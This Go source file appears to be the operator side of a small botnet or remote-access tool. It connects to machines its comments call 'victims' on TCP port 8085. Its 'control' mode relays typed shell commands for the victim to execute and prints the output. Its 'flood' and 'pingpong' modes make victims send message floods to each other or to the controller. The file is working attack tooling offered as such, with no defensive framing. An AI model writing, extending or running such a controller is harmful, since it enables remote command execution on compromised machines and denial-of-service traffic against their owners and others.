package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
)

const (
	connPort = ":8085"
	connType = "tcp"
)

/*
* Makes the victim send "PING" to another victim, who will reply back with "PONG"
* The two victims will constantly message each other back
*
* conn: A net.Conn to the victim
*
* victim: A string of the IP address of the other victim
 */
func pingpong(conn net.Conn, victim string) {
	fmt.Fprintf(conn, "PONG "+victim+"\n")
}

/*
* Sends a choosen number of PONG messages to the victim. The victim replies back with PING, but the controller does not print it
*
* conn: A net.Conn to the victim
* count: How many times the "PONG" message should be sent
 */
func flood(conn net.Conn, count int) {
	for i := 0; i < count; i++ {
		fmt.Fprintf(conn, "PONG\n")
	}
	fmt.Fprintf(conn, "exit\n")
}

/*
* Has the victim run shell commands with exec.Command().
* The victim will then send the output back. The exit command will exit this function
*
* conn: A net.Conn to the victim
 */
func control(conn net.Conn) {
	var input string
	for {
		fmt.Print(">")
		commandInput := bufio.NewReader(os.Stdin)
		input, _ = commandInput.ReadString('\n')
		command := strings.Fields(input)
		if len(command) == 0 {
			continue
		}
		if command[0] == "exit" {
			fmt.Fprintf(conn, input+"\n")
			break
		}
		fmt.Fprintf(conn, input+"\n")
		fmt.Println("Command sent: " + input)
		reply := bufio.NewScanner(conn)
		println("Reply recieved:")
		for reply.Scan() {
			r := reply.Text()
			if len(r) == 0 {
				break
			}
			fmt.Println(r)
		}
	}
	return
}

/*
* Handles input and command selection. Also handles connected to the victim
 */
func main() {

	var input string
	commandInput := bufio.NewReader(os.Stdin)
	for {
		fmt.Print(">")
		input, _ = commandInput.ReadString('\n')
		command := strings.Fields(input)
		var connAddress string
		if len(command) == 0 {
			continue
		}
		if command[0] == "connect" {
			if len(command) <= 1 {
				fmt.Println("Please enter an IP address")
				continue
			}
			connAddress = command[1] + connPort
			fmt.Println("Connecting to: " + connAddress)
			conn, err := net.Dial(connType, connAddress)
			if err != nil {
				fmt.Println("Could not connect. Please retry")
				continue
			}
			fmt.Println("Connection Successful")
			control(conn)
		} else if command[0] == "flood" {
			if len(command) <= 2 {
				fmt.Println("Please enter an IP address and count")
				continue
			}
			connAddress = command[1] + connPort
			count, _ := strconv.Atoi(command[2])
			fmt.Println("Connecting to: " + connAddress)
			conn, err := net.Dial(connType, connAddress)
			if err != nil {
				fmt.Println("Could not connect. Please retry")
				continue
			}
			fmt.Println("Connection Successful")
			flood(conn, count)
		} else if command[0] == "pingpong" {
			if len(command) <= 2 {
				fmt.Println("Please enter two IPs")
				continue
			}
			connAddress = command[1] + connPort
			conn2 := command[2]
			fmt.Println("Connecting to: " + connAddress)
			conn, err := net.Dial(connType, connAddress)
			if err != nil {
				fmt.Println("Could not connect. Please retry")
				continue
			}
			fmt.Println("Connection Successful")
			pingpong(conn, conn2)
		}
	}
}
